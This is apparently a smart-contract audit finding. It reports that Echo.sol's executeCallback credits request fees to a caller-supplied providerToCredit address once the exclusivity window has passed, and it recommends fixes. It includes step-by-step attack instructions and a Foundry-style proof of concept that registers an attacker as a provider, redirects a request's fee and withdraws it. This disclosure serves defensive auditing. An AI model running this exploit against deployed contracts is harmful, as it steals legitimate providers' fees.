### Title
Attacker-Controlled `providerToCredit` in `executeCallback()` Enables Fee Theft from Legitimate Providers — (`File: target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.executeCallback()` accepts a caller-supplied `providerToCredit` address and unconditionally credits the entire request fee to that address's `accruedFeesInWei` balance. After the exclusivity period expires, there is no validation that `providerToCredit` equals `req.provider`. An unprivileged attacker who has registered as a provider can redirect fees earned by the legitimate provider to themselves and withdraw them.

---

### Finding Description

In `Echo.sol`, `requestPriceUpdatesWithCallback` stores the user-paid fee (minus the Pyth protocol fee) in `req.fee` and records `req.provider` as the intended fulfiller: [1](#0-0) 

When `executeCallback` is later called, it enforces that `providerToCredit == req.provider` **only during the exclusivity window**: [2](#0-1) 

Once that window closes, the check is skipped entirely. The fee is then credited to the **caller-supplied** `providerToCredit` with no further validation: [3](#0-2) 

There is no check that `providerToCredit` is a registered provider, nor that it matches `req.provider`. Provider registration is permissionless: [4](#0-3) 

A provider can set their own fee manager to themselves and then withdraw via `withdrawAsFeeManager`: [5](#0-4) 

---

### Impact Explanation

The legitimate provider (`req.provider`) loses 100% of the fees they earned for fulfilling a request. The attacker receives those fees and can withdraw them. This is a direct theft of provider revenue. Every unfulfilled request whose exclusivity period has elapsed is exploitable. The impact scales with the number of pending requests and the fee size per request.

---

### Likelihood Explanation

The exclusivity period is configurable and defaults to 15 seconds. Any request that is not fulfilled within that window (e.g., due to network congestion, provider downtime, or deliberate delay) becomes exploitable. The attacker only needs to:
1. Register as a provider (permissionless, one-time setup).
2. Set themselves as their own fee manager (one-time setup).
3. Monitor the mempool for unfulfilled requests past their exclusivity window.
4. Call `executeCallback` with their own address as `providerToCredit`.

This requires no privileged access, no leaked keys, and no collusion. It is a straightforward griefing/theft attack executable by any EOA.

---

### Recommendation

After the exclusivity period, restrict `providerToCredit` to either:
- The original `req.provider`, or
- A registered provider address (i.e., `_state.providers[providerToCredit].isRegistered == true`).

The simplest fix is to ignore the `providerToCredit` parameter entirely and always credit `req.provider`:

```solidity
_state.providers[req.provider].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

If the intent is to allow any registered provider to fulfill after exclusivity, add:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
```

### Proof of Concept

**Setup (one-time):**
```solidity
// Attacker registers as a provider with zero fees
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// Attacker sets themselves as their own fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);
```

**Per-request exploit:**
```solidity
// 1. Legitimate user makes a request to defaultProvider
uint96 totalFee = echo.getFee(defaultProvider, gasLimit, priceIds);
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    defaultProvider, publishTime, priceIds, gasLimit
);

// 2. Wait for exclusivity period to expire (default: 15 seconds)
vm.warp(block.timestamp + 16);

// 3. Attacker calls executeCallback with their own address as providerToCredit
vm.prank(attacker);
echo.executeCallback(attacker, seq, updateData, priceIds);
// req.fee is now credited to _state.providers[attacker].accruedFeesInWei

// 4. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// attacker.balance increased by stolen fees; defaultProvider receives nothing
```

The legitimate `defaultProvider` receives zero fees despite the request being assigned to them.
